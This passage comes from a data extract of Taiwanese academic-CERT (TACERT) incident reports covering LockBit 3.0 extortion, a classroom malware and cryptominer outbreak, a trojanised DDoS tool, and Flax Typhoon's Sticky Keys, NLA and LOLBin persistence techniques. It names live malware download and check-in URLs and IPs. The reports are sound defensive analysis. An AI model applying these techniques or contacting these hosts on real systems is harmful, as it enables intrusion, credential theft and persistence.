TANet Computer Emergency Response Team 10. LockBit 3.0 提供受害組織三個選擇方案,分別為展延時間24 小時($10,000)、 銷毀所有資料($490,000)與取得獨家下載所有公司資料的權限($490,000),而 每個方案的支付金額會因受害組織不同而有差異。 方案1:支付一萬美金,計時器將再延長24 小時。",
        "Page_Num": "3,4,5,6"
    },
    "595": {
        "File_Name": "個案分析-雙重勒索軟體LockBit 3.0分析報告.pdf",
        "content": " 6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 方案2:支付49 萬美金,所有有關公司的所有資訊將被銷毀,並且從BLOG 中刪除。 方案3:支付49 萬美金,獲得獨家下載所有公司資料的權限。 11. 為了取信於受害組織,駭客在BLOG 上公開受害組織資訊的頁面也提供所竊 取資料的佐證與截圖,以證明有竊走該組織之資料。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 該勒索團體告訴受害者如何保證不欺騙受害者,並且提供Twitter 上大家討論 LockBit 攻擊的連結。他們也告訴受害者可以透過LockBit CHAT 的連結與 Personal ID 與他們聯絡。在LockBit CHAT 頁面輸入Personal ID 與驗證碼即 可登入到受害者專屬與駭客洽談頁面。 13. 在受害者與駭客洽談頁面,駭客再次告訴受害者你的檔案被加密了,以及要 如何復原檔案。該網頁可讓受害者給駭客留言與提供受害者試用解密器解密 一個檔案。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 14. 當受害組織給付贖金期限已過後,將會以PUBLISHED(已發佈)標示於 LockBit BLOG 上。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 在LockBit BLOG 上瀏覽某個已到期的受害組織資訊,可看到駭客將受害組 織資料標示為PUBLISHED,並於該網站上公開發佈所竊取的資料。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 16. 在LockBit BLOG 上點選Mirrors 後可看到分成三個部分的內容,分別為 BLOG MIRRORS、SERVERS WITH BACKUPS AND DIRECT LINKS 與 CHATS RESERVE MIRRORS。 17. 在02. SERVERS WITH BACKUPS AND DIRECT LINKS 內容,選擇任一個 Mirror 點選進入後,會看到可用公司名稱來搜尋受害組織資訊。這種在",
        "Page_Num": "6,7,8,9,10,11"
    },
    "596": {
        "File_Name": "個案分析-雙重勒索軟體LockBit 3.0分析報告.pdf",
        "content": "網站 新增搜尋功能的方式,將便利其他網路犯罪者找尋可下手的目標。 點選某個受害組織名稱後,可看到該組織已被駭客公開發佈的資料,並且可 免費下載這些資料。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 18. 在勒索通知信HLJkNskOq.README.txt 中,駭客警告受害者不要要求警察或 FBI 幫忙,也不要告訴任何人你受到LockBit 攻擊。 駭客告訴受害者你公司的資料被洩漏後會產生什麼危險,例如:會有來自政府 的罰款。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 駭客也警告不要找資料復原公司,因為他們只想賺你的錢並且騙你。最後警 告受害者如果不付錢,在未來就會攻擊你的公司。 19. 將勒索通知信與被加密檔案送至ID Ransomware 勒索軟體識別網站檢測,確 認其目前尚未有解密器。 20. 該樣本首次被上傳至Virustotal 檢測日為2022-07-03 20:20:43 UTC,為很新的 樣本。Virustotal 檢測其惡意比例為56/69。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、 攻擊行為 1. 勒索軟體組織LockBit 透過受感染的電子郵件附件、種子網站或惡意廣告來 散播勒索軟體LockBit 3.0。 2. 受害主機感染LockBit 3.0 後執行下列各步驟: 2.1 加密資料類型的檔案。 2.2 變更被加密檔案檔名。 2.3 使用HLJkNskOq.ico。 2.4 產生勒索通知信HLJkNskOq.README.txt。 2.5 更換桌布HLJkNskOq.bmp。 2.6 在C:\\ProgramData 產生暫存檔1376.tmp。 2.7 刪除暫存檔1376.tmp。 3. 受害者可使用Tor 與勒索軟體組織聯絡。 3.1 在LockBit BLOG 可瀏覽BLOG 知悉受害組織資訊與3 個選擇方案。 3.2 在LockBit CHAT 可使用CHAT",
        "Page_Num": "11,12,13,14"
    },
    "597": {
        "File_Name": "個案分析-雙重勒索軟體LockBit 3.0分析報告.pdf",
        "content": "網頁與勒索軟體組織聯絡。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結與建議 1. 本案檢測時發現LockBit 3.0 僅加密資料類型之檔案、修改檔案名稱、更改桌 面桌布,並在桌面上放置一個名為HLJkNskOq.README.txt 的勒索通知信。 它將被加密檔案之檔案名稱及其擴展名稱替換為隨機動態與靜態字串 ([random_string].HLJkNskOq)。 2. LockBit 3.0 採用雙重勒索的策略,使用Tor 在其專屬暗網BLOG 上宣布新的 受害組織與提供搜尋功能。在BLOG 上公告即將要發佈的受害組織資料,造 成受害者無形的壓力。又提供CHAT 網頁作為受害者聯絡LockBit 勒索團體 的管道。這些做法加強雙重勒索的實現,與以往勒索軟體攻擊手法不同。 3. LockBit 透過受感染之電子郵件附件、種子網站或惡意廣告散播,故預防其方 法為定期備份資料,不隨意開啟或瀏覽不明來源之惡意檔案或網站。 4. 若感染LockBit,因尚無解密器,建議可將被加密檔案留存,以待未來有解密 器時解密。 5. 對於LockBit 所竊取資料的安全性防護,建議對於重要或機敏資料以輸入密 碼存取方式保存,以防資料遭竊後被讀取。 ",
        "Page_Num": "14,15"
    },
    "598": {
        "File_Name": "個案分析-電腦教室主機群體感染惡意程式攻擊事件分析報告_10804.pdf",
        "content": "電腦教室主機群體感染 惡意程式攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年4 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 某學校在2019/ 3 中旬校園電腦陸續群體觸發「Malicious File Download/Malicious Binary Download」(由遠端下載惡意程式) 的資安事件, 兩星期內被開76 張資安通報單,為了解群體主機觸發資安事件的原因,學校 請求本中心協助進行鑑識作業。 2. 所感染的主機群中有大量主機來自校園內某單位之電腦教室,教室內32 台電 腦中有25 台電腦受感染。 3. 這些電腦教室主機的事件發生時間皆為2019/3/28 18:23~19:43,當時廠商正 進行系統更新維護作業。 4. 從資安通報單的佐證資料得知這些受害主機會連線目的IP:128.199.64.236 的 80 port。 二、事件檢測 1. 首先,該電腦教室有30 台學員用主機與2 台教師用主機。檢視電腦教室內各 感染主機系統環境設定發現如下表結果。 主機 主機系統 主機 用途 帳戶 是否 設定 密碼 是否 安裝 還原 卡 防火牆與 port 開啟 狀態 系統更新 日期 病毒碼 更新日期 94 主機 (Teacher 2-PC) Windows 7 SP1 教師 用 否 是 防火牆未 開啟、開啟 許多port 2015/9/3 2010/11/19 其他感 染主機 Windows 7 SP1 學員 用 否 是 防火牆未 開啟、開啟 許多port 2015/9/3 2010/11/19 2. 該單位人員表示廠商在2019/3/27 先對94 主機進行系統更新作業,之後 2019/3/28 對學員用主機進行系統更新,故本個案將優先檢測94 主機。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢視94 主機之系統登入紀錄,發現駭客在2019/3/2 曾駭入94 主機後新增帳 戶k8h3d。從紀錄可以得知",
        "Page_Num": "1,2,3"
    },
    "599": {
        "File_Name": "個案分析-電腦教室主機群體感染惡意程式攻擊事件分析報告_10804.pdf",
        "content": "校園IP:140.X.X.53 登入94 主機的第一筆時間在 2019/3/2 上午8:57,之後9:07 新增帳戶k8h3d,建立帳戶後當天9:07 起陸續 以此IP 登入帳戶k8h3d。 4. 在2019/3/28 19:10 廠商進行系統更新時,帳戶k8h3d 被刪除。檢測時也發現 其他受害主機在惡意程式執行期間,會自動建立帳戶k8h3d,提供駭客入侵 主機的管道。在所有受害主機中,建立帳戶k8h3d 的時間以94 主機的時間 2019/3/2 最早。 5. 在94 主機的C:\\Windows\\Temp 內發現多個2019/3/28 建立的惡意檔案,從其 中3 個惡意檔案mkatz.ini、m2.ps1 與meyvs.exe 可以得知駭客的攻擊行為, 其檔案功能與virustotal 檢測結果如下表所示。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檔案名稱 功能 virustotal mkatz.ini 存放94 主機的帳戶與密碼資訊,為使用mimikatz 竊取主機 帳戶與密碼後存放資訊的檔案 --- m2.ps1 從惡意網址下載到主機內的可用powershell 執行的程式碼 29/55 meyvs.exe 對外大量連線445 port 與1433 port 44/61 檢視m2.ps1 為PowerShell Scripts 的檔案,內有一大段程式碼,推測為駭客傳送 至主機內要使用powershell 來執行的程式。 6. 在94 主機的C:\\Windows 內發現3 個2019/3/28 建立的惡意程式HusSDz.exe、 tL4EuCGZ.exe 與S89PlnBr.exe,其檔案功能與virustotal 檢測結果如下表所示。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 惡意檔案名稱 功能 virustotal HusSDz.exe 取得mac address 與呼叫Q6REQ6.exe 進行挖礦 41/70 tL4EuCGZ.exe 為",
        "Page_Num": "3,4,5"
    },
    "600": {
        "File_Name": "個案分析-電腦教室主機群體感染惡意程式攻擊事件分析報告_10804.pdf",
        "content": "通過SMB,MS SQL 或利用Windows 操作系統中 的漏洞傳播的蠕蟲程式。 42/70 S89PlnBr.exe 取得UUID 與mac address 資訊 41/71 7. 檢視94 主機的對外網路連線狀態,發現下列結果: (1) meyvs.exe 會大量連線校內與校外網段內所有IP 的445 port 與 1433 port。 (2) powershell.exe 會連線南韓IP:27.102.107.137。 (3) meyvs.exe 會連線美國IP:153.92.4.49。 (4) Q6REQ6.exe 會連線南韓IP:141.98.213.220 與27.102.118.147。 8. 從94 主機的側錄封包分析得知,程式meyvs.exe 執行時會大量連線校內、外 各網段IP 之445 port 與1433 port,當連線登入成功後,會在主機內建立檔案、 上傳惡意程式、刪除惡意程式...等。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 從94 主機的側錄封包分析得知,程式powershell.exe 執行時會連線南韓 IP:27.102.107.137/status.json 回傳主機狀態後,再連線 http://v.beahh.com/eb?64 下載惡意程式m2.ps1。 powershell.exe 也會連線南韓IP:27.102.107.137 之另一個網址 p.beahh.com/upgrade.php 來更新主機狀態資訊。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 從94 主機的側錄封包分析得知,程式meyvs.exe 連線美國IP:153.92.4.49 (http://pp.abbny.com/t.php)時會傳送主機名稱、mac 值、作業系統資訊...等給 對方主機。 11. 從94 主機的側錄封包分析得知,程式Q6REQ6.exe 連線南韓 IP:141.98.213.220 與27.102.118.147 是登入礦池、進行挖礦作業,推測 Q6REQ6.exe 為一個挖礦程式。Q6REQ",
        "Page_Num": "5,6,7"
    },
    "601": {
        "File_Name": "個案分析-電腦教室主機群體感染惡意程式攻擊事件分析報告_10804.pdf",
        "content": "6.exe 經virustotal 檢測,其惡意比例為 36/70,而且有多家防毒軟體公司以Miner 用字稱呼它。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 檢視94 主機的背景程式運作情形,發現meyvs.exe 會呼叫ipconfig.exe 與 netstat.exe 進行網路port 掃描,之後執行powershell 下載m2.ps1,接著執行 S89PlnBr.exe 來取得連線IP 的macaddress,最後執行HusSDz.exe 來取得 macaddress 與執行挖礦程式Q6REQ6.exe,而且程式HusSDz.exe 會被重複執 行著。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 其中一個透過cmd.exe 呼叫powershell.exe 來執行的powershell,則從其 command 內容可以看出會至http://down.beahh.com/newol.dat 下載惡意程式碼。 13. 探討「94 主機有安裝系統還原卡,為何2019/3/2 有駭客入侵紀錄存在?」之 問題,發現下列現象。 (1) 檢視系統還原卡的設定,發現系統還原卡可設定重開機N 次後在下一次 啟動時才鎖住系統狀態。 (2) 系統還原卡之登入密碼存放於D:\\內,檢視存放密碼的Word 檔,發現該 資安通報單的佐證資料之目的IP  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 內容已被清空。 (3) 94 主機所使用的還原卡為軟體式,當該還原卡的驅動程式被更換存放位 置或變更其檔案名稱時,將使還原卡功能喪失。 14. 檢視系統操作執行紀錄,發現在2019/2/27 廠商更新字型,並且在2019/3/2 主機重啟後還原卡功能解除,推測因當時還原卡設定為重新開機一次後在下 一次啟動時才鎖住系統狀態造成。 15. 檢視其他受害主機之感染狀況,發現下列情形: (1)在C:\\",
        "Page_Num": "7,8,9,10"
    },
    "602": {
        "File_Name": "個案分析-電腦教室主機群體感染惡意程式攻擊事件分析報告_10804.pdf",
        "content": "windows 內皆會有3 個與94 主機名稱不同但功能相同的惡意程式。 (2)在C:\\winodws\\temp 內皆會有與94 主機相同的惡意檔案,但是執行檔名稱 不同、功能相同。 (3)皆會新增帳戶k8h3d 於主機內。 (4)皆會對外大量連線445 port 與1433 port。 (5)皆會存在挖礦程式於主機內進行挖礦。 因此可以得知其他受害主機之感染特徵與94 主機相同,而94 主機為所有受 害主機中第一個建立帳戶k8h3d 的主機,推測教室內主機受感染來源來自94 主機。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 本個案之事件攻擊行為從2019/3/2 駭客入侵至94 主機開始,分別敘述如 下。 1.駭客從網路連線登入94 主機。 2.駭客於94 主機內新增帳戶k8h3d。 3.駭客透過94 主機大量感染教室內主機。 3a1.meyvs.exe 執行後呼叫ipconfig.exe 與nestat.exe 來大量對外連線445 與 1433 port (port scan).。 3a2.meyvs.exe 執行時會傳送主機資訊給IP:153.92.4.49。 3b.執行powershell.exe 從遠端下載惡意程式至主機內。 3c.執行S89PlnBr.exe 取得UUID 與mac address 資訊。 3d.執行HusSDz.exe 取得網域內連線IP 的mac address 與呼叫Q6REQ6.exe 進行挖礦 (連線2 個礦池)。 3e.新增帳戶k8h3d 於受害主機內。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、建議與總結 1. 系統還原卡為一般學校管理電腦教室會安裝的工具,一般認知有安裝還原 卡則系統不會中毒。透過本個案的檢測指出系統還原卡會引發下列的資安 問題。 (1)因為有還原卡,系統與病毒碼未定期進行更新。",
        "Page_Num": "10,11,12"
    },
    "603": {
        "File_Name": "個案分析-電腦教室主機群體感染惡意程式攻擊事件分析報告_10804.pdf",
        "content": "(2)主機使用時,系統無防毒能力。 (3)主機使用時,可能系統中毒去攻擊其他主機,容易變成駭客入侵後對 外攻擊的跳板。 (4)因久未系統更新,一旦進行更新則需花費許多作業時間,容易在更新 期間感染病毒。 由以上問題可以得知「系統還原卡不是永久安全,有安裝的主機也不是一 定不會中毒」。 2. 檢視本個案的資安防護措施,有下列幾點缺失: (1)電腦教室內所有主機皆未設定密碼即可登入系統。 (2)因為安裝還原卡,故各主機多年未進行系統與病毒碼更新。 (3)各主機皆未開啟防火牆,但卻開啟許多個port。 (4)將軟體還原卡登入設定之密碼存放於主機內,造成駭客容易取得。 (5)所安裝的軟體還原卡可被駭客登入主機後,手動使其還原功能失效。 3. 檢視本個案之情況,有下列幾點建議改善措施提供參考。 (1)教室內各主機須建立登入系統的密碼,並加強密碼強度。 (2)建議使用硬體還原卡代替軟體還原卡。 (3)建議將駭客容易使用來攻擊的port 鎖住,如445 port。 (4)使用官方網站下載軟體,來定期進行系統與病毒碼更新作業。 (5)勿存放帳號與密碼資訊於主機內。 4. 從檢測本個案之受害主機群發現,此類型的攻擊事件在受害主機一旦感染 惡意程式後,會在校園區域網路內散播惡意程式,建議優先封鎖惡意程式  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 的下載網址IP:27.102.107.137、128.199.64.236 與153.92.4.49。 ",
        "Page_Num": "12,13"
    },
    "604": {
        "File_Name": "個案分析-駭客常用的 DDoS 攻擊程式分析報告_10411.pdf",
        "content": "1 個案分析- 駭客常用的 DDoS 攻擊程 式分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/11  2 I. 事件簡介 1. 網路攻擊中最常發生的也最難防範的就是DDoS 攻擊,因為駭客攻擊的伺 服器主機都是透過合法的通訊埠進行流量攻擊,導致正常服務被癱瘓阻 斷。 2. 駭客可能在某些地下網站散布此類的攻擊套件供民眾使用,除了讓使用者 成為攻擊者,也可能讓使用者主機成為殭屍電腦為駭客所用。 3. 本單位透過一些方式取得到駭客常用的流量攻擊套件,並實地測試該套件 的功能以及可能潛藏的危害。 4. 該惡意程式的檔案名稱為 DDoS Attack.exe,為Windows 環境所用。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7 系統進行隔離環境測試。 2. 惡意程式樣本名稱為 DDoS Attack.exe,安裝過程中出現的都是簡體中 文,因為編碼關係系統無法正常顯示。 3. 待該惡意工具安裝完後先檢視其系統程式運作狀態,發現內部藏有木馬程 式在背景執行。正常來說 explore 檔案總管只會有一個,該惡意程式會 呼叫第二個explore 在最下方進行監控主機資料。  3 4. 檢視惡意的explore.exe 內容,是由剛剛所安裝的DDoS Attack 軟體所執 行,然而此時該軟體尚未啟用。 5. 檢查該explore 的網路連線狀態,確實出現可疑的對外連線,疑似將資 料傳送到美國的IP 為162.210.101.140 的port 80。 6. 實際測試該IP 的網站狀態,確實port 80 的WEB 服務有啟用,然而並無 權限進行存取,研判是程式進行回報監控動作。  4 7. 檢查系統的開機啟用狀態,發現有一支惡意程式寫入開機自動啟用。然而 進一步檢查 Windows\\security\\rzsblotiu.exe 卻無法開啟該以藏資料 夾,疑似無權限存取。 8. 實地開啟 DDoS Attack 軟體,出現的介面中",
        "Page_Num": "1,2,3,4"
    },
    "605": {
        "File_Name": "個案分析-駭客常用的 DDoS 攻擊程式分析報告_10411.pdf",
        "content": "可以輸入被攻擊者的IP 或 URL,測試一台自己的內部主機IP,下方可以選擇要攻擊的port 號以及 使用的協定共三種,分別為TCP、UDP 以及HTTP 方式。右邊可以選擇發送 封包的速度,下方則會顯示目前已經發送的封包數量。 9. 以下為測試發送UDP 封包至對方的port 80,透過TCPview 檢視可以看到 本機端的port 為亂數發送UDP,卻無法看到目的IP 地址以及port 號,  5 都是以*符號顯示,但可以看到右側的封包流量在急速上升中,表示此攻 擊確實在進行中。 10. 檢查封包資訊,一開始攻擊程式安裝完後,explore.exe 會先向 162.210.101.140 的port 80 進行資料傳送,透過HTTP POST 方式傳送編 碼過的資料,可能為敏感性的個資帳號或密碼。 11. 檢查攻擊封包傳送狀態,測試方式有UDP 和TCP 的port 80 攻擊,因為 目的主機沒有開啟TCP port 80 服務,故主要以UDP 的port 80 進行Flood 攻擊。  6 12. 檢查 UDP 的封包內容,確實是以攻擊程式中的TCP/UDP message 去填 塞內容。 13. 透過Virustotal 線上掃毒, DDoS Attack 的被偵測率有 39/57,雖然 該程式主要是為Hack tool,但同時也是一支木馬程式,一旦使用可能成 為駭客的殭屍主機。  7 III. 網路架構圖 被攻擊者IP TCP、UDP Flood 使用者BOT Faris.t28.net 美國 162.210.101.140 STEP 2 竊取個資 惡意程式 DDoS Attack 駭客 STEP 1 安裝惡意程式 STEP 3 工具 DDoS 攻擊 散播惡意程式 監控網站 受害主機群 STEP 5 殭屍主機 DDoS 攻擊 STEP 4 發布攻擊指令給 BOT 1. 使用者可能透過地下網站或論壇下載攻擊程式DDoS Attack。 2. 主機安裝攻擊程式後向「162.210.101.140:80」報到並竊取個資成為殭屍主",
        "Page_Num": "4,5,6,7"
    },
    "606": {
        "File_Name": "個案分析-駭客常用的 DDoS 攻擊程式分析報告_10411.pdf",
        "content": "機。 3. 使用者使用攻擊工具向特定主機進行UDP 或TCP 的Flood 攻擊。 4. 駭客可能透過該木馬程式下達攻擊指令。 5. 殭屍主機收到攻擊指令就會向其他主機進行DDoS 攻擊。  8 IV. 建議與總結 1. 建議使用者不要下載安裝此類的攻擊軟體,通常都內含木馬程式。 2. 使用者對外部主機進行DDoS 的Flood 攻擊是違法行為,因為任何攻擊行 為都會留下IP 紀錄。 3. 成為殭屍電腦後駭客也是可能利用來對外進行攻擊,成為駭客的攻擊跳 板。 4. DDoS 攻擊往往透過合法的網路通訊埠進行大流量封包阻斷其他正常服 務,其維持時間通常不會很久,並且此種攻擊很難防範,但是一旦發生時 候服務中斷可能造成相當大的損失。 ",
        "Page_Num": "7,8"
    },
    "607": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 寄生合法工具之駭客組織 Flax Typhoon 攻擊分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2023 年09 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 2023/8 微軟安全研究員發現新駭客組織Flax Typhoon 自2021 年中發起攻 擊行動以來一直活躍,而攻擊目標是台灣的政府機關、教育機構、重要製 造商與資訊技術組織。 2. 該組織為一個國家資助的攻擊組織,其行動基地在中國,除了台灣之外, 在東南亞、北美和非洲也觀察到了他們的攻擊痕跡。 3. Flax Typhoon 的特別之處在於它們對惡意軟體的依賴最小。他們的攻擊方 式很大程度上取決於使用作業系統內建的合法工具和其他典型的良性軟 體。 二、 攻擊活動分析 Flax Typhoon 之攻擊鏈可以分為9 個活動階段,分別為初始訪問(Initial access)、執行(Execution)、持久(Persistence)、權限提升(Privilege Escalation)、防禦規避(Defense Evasion)、憑證訪問(Credential Access)、發 現(Discovery)、橫向移動(Lateral Movement)以及命令與控制(Command and Control)等,將這攻擊鏈結合MITRE ATT&CK 框架分析如下。 圖1 Flax Typhoon 之攻擊鏈 (資料來源: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-soft ware-to-quietly-access-taiwanese-organizations/) 1. 初始存取(Initial access)TA0001 Flax Typhoon 通過利用服務大眾的伺服器中的已知漏洞實現初始存取  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team [T1190]。目標伺服器所提供的服務各不相同,但包括 VPN、Web、Java 和 SQL 應用程序。這些漏洞利用",
        "Page_Num": "1,2,3"
    },
    "608": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": "的有效負載(payload)是一個Web shell [T1505.003],例如 China Chopper(中國菜刀)就是一種Web Shell,它允許攻 擊者遠端控制目標系統,在受感染的伺服器上遠端執行代碼。 2. 權限提升(Privilege escalation)TA0004 如果通過 Web shell 感染的程序沒有本地管理員權限,則Flax Typhoon 會下載並執行一款惡意軟體,該惡意軟體利用一個或多個已知漏洞來獲取本 地系統權限。例如:使用開源程式Juicy Potato、BadPotato 和其他開源工具來 利用這些漏洞,以獲得本機系統的更高等級權限[T1068、T1546.015]。 Juicy Potato 與BadPotato 為兩個具有相同功能「萬能鑰匙」的不同品牌。 Juicy Potato 透過模仿 Windows 中的合法 COM 物件來實現更高的權限,而 BadPotato 則透過欺騙「守衛」(NTLM 驗證)來實現類似的目的。 開源工具 說 明 Juicy Potato 一種常見的Windows 本機提權工具,用於劫持Windows 服 務和流程。 由於是開源的,可以很容易地在網路上找到它。 此工具通常用於後門攻擊或其他需要提升使用者權限的攻 擊。它的主要功能是劫持 Windows 的 COM(組件物件模 型)物件。 簡單來說,COM 物件是 Windows 中用於不同 應用程式和服務之間通訊的機制。 Juicy Potato 冒充合法的 COM 物件以獲得更高的執行權限。 BadPotato Windows 中用於本機權限提升的工具,其用途類似於 Juicy Potato。它也是開源的,通常用於複雜的攻擊模式。它利用 Windows NTLM 驗證過程中存在的漏洞。 NTLM(NT LAN Manager)是一種用於 Windows 網路內驗證的協定。 BadPotato 透過「偽造」或「欺騙」此身份驗證過程來獲得  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 開源工具 說 明 提升的權限。 3. 持久(Persistence)TA0003 一旦 Flax Typhoon ",
        "Page_Num": "3,4"
    },
    "609": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": "可以使用本地管理員權限訪問 Windows Management Instrumentation 命令行 (WMIC)、PowerShell 或 Windows 終端 機[T1059],攻擊者就會建立一種使用遠端桌面協議 (RDP)存取受感染系統的 持久方法[T1021]。為了實現此目的,攻擊者關閉 RDP 的網路層身份驗證 (NLA),替換Sticky Keys 的二進位檔,並建立 VPN 連線。 使用 RDP 時,通常需要嚴格的身份驗證才能獲得存取權限。 例如,網 路層級身份驗證 (NLA) 要求連線使用者在建立完整的遠端工作階段並顯示 Windows 登入畫面之前先透過遠端系統進行驗證。關閉 NLA 後,任何嘗試 存取遠端系統的使用者都可以在進行身份驗證之前與 Windows 登入畫面進 行交互影響,這可能會使遠端系統遭受連線使用者的惡意操作。攻擊者找到 了一種透過更改登錄機碼來停用 NLA 從而繞過 Windows 上的身份驗證過 程的方法。該技術利用了 Windows 中稱為「Sticky Keys(黏性特殊鍵)」的功 能,因此攻擊者將使用Sticky Keys 的捷徑方式。Flax Typhoon 使用下列命令 修改登錄機碼來關閉NLA: 圖2 Flax Typhoon 關閉NLA 之指令 Sticky Keys(黏性特殊鍵)是為身體殘疾的使用者設計的輔助功能,允許他 們一次按下一個修飾鍵(例如 Shift、Ctrl、Alt),而不是同時按下。當使用 者在登入畫面上連續按 Shift 鍵五次時,會觸發名為「sethc.exe」的程序, 該程序通常用於啟用或管理黏性特殊鍵。使用者可以隨時呼叫此捷徑方式, 包括在登入畫面上。Flax Typhoon 濫用此功能 [T1546.008],修改與 sethc.exe  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 關聯的 Windows 登錄機碼並新增某些參數,導致 Windows 工作管理員作為 sethc.exe 的偵錯器啟動。因此,當觸發 sethc.",
        "Page_Num": "4,5"
    },
    "610": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": "exe 時,Windows 工作管理員 將以提升的權限啟動。鑑於工作管理員的提升權限,攻擊者可以執行許多未 經授權的操作,包括但不限於終止程序和更改系統設定。這相當於攻擊者獲 得了受感染系統內的系統權限並可執行任何操作。因此,當攻擊者在 Windows 登入畫面上使用黏性特殊鍵捷徑時,工作管理員將以本地系統權限 啟動。Flax Typhoon 使用下列命令修改黏性特殊鍵的行為: 圖3 Flax Typhoon 修改黏性特殊鍵行為之指令 在此階段,Flax Typhoon 可以通過 RDP 訪問受感染的系統,使用登入 畫面上的黏性特殊鍵捷徑,並使用本地系統權限存取工作管理員。從那裡, 攻擊者可以啟動終端,建立記憶體傾印,並對受感染的系統執行任何其他操 作。 4. 橫向移動(Lateral Movement)TA0008 如前所述,Flax Typhoon 建立了一種使用遠端桌面協定 (RDP) 存取受 感染系統的持久方法。然而,鑑於當今組織中限制 RDP 的廣泛網路安全策 略,為了允許攻擊者隨時從外部網路存取受感染的系統,則必須克服 RDP 通常僅在內部網路介面中使用的限制。為了實現對受感染系統的外部網路存 取,Flax Typhoon 利用合法 VPN 的安裝,使受感染的系統能夠自動連接到 攻擊者控制的網路基礎設施。 如果 Flax Typhoon 需要橫向移動來存取受感染網路上的其他系統,除 了 RDP 之外,攻擊者還將利用「Living Off The Land Binaries」(縮寫為 LOLBins),其中包括 Windows 遠端管理 (WinRM) [ T1021. 006] 和WMIC [T1047]。 5. 命令與控制(Command and control)TA0011  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 為了成功部署和維護 VPN 連線以實現持久性,Flax Typhoon 從其網路 基礎設施下載 SoftEther VPN 的可執行檔,",
        "Page_Num": "5,6"
    },
    "611": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": "這是一種合法的開源 VPN 工 具。由於該工具是合法的,防毒軟體通常不會偵測到它。攻擊者使用多個寄 生攻擊(LOLBins)手法的其中一個手法下載SoftEther VPN,例如 PowerShell Invoke-WebRequest 實用程序、certutil 或 Bitsadmin 等這些Windows 中的合 法工具。 合法工具 說明 PowerShell Invoke-WebRequest 這是一個 PowerShell 命令,主要用於從網路下載資料 或與 Web 服務互動。它本質上充當 HTTP 使用者端, 能夠發送各種 HTTP 請求(GET、POST、PUT 等)。 由 於此工具內建於大多數 Windows 系統中,因此網路安 全工具可能會將其視為正常行為,這也是其可能被濫用 的原因之一。 certutil 該工具最初是為管理憑證而設計的,但它也有一個用於 下載檔案的功能。當用於下載時,它利用HTTP 協定從 指定的URL 取得資料。由於其主要目的不是檔案下載, 防毒軟體可能無法立即識別其潛在的濫用行為。 Bitsadmin 用於啟動下載或上傳任務並監控其進度的命令列工具。 它利用後台智慧傳輸服務(BITS)技術,允許檔案在網 路斷開和重新連接後恢復傳輸。 儘管這個工具有些過 時,但它仍然存在於許多 Windows 系統上。 由於它與 瀏覽器或其他常見網頁工具沒有直接關聯,因此其濫用 可能不太容易被發現。 然後,Flax Typhoon 使用服務控制管理員 (SCM) 設定一個 Windows 服務,該服務在每次系統啟動時自動啟動VPN 連線。這可以讓攻擊者監控受  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 感染系統的可用性,並持續建立 RDP 連線。Flax Typhoon 使用下列指令來 下載 SoftEther VPN 可執行檔。 圖4 Flax Typhoon 下載SoftEther VPN 執行檔之指令 Flax Typhoon 使用下列命令建立服務來啟動 VPN 連線。 圖 5. Flax Typhoon 建立服務以啟動 VPN ",
        "Page_Num": "6,7"
    },
    "612": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
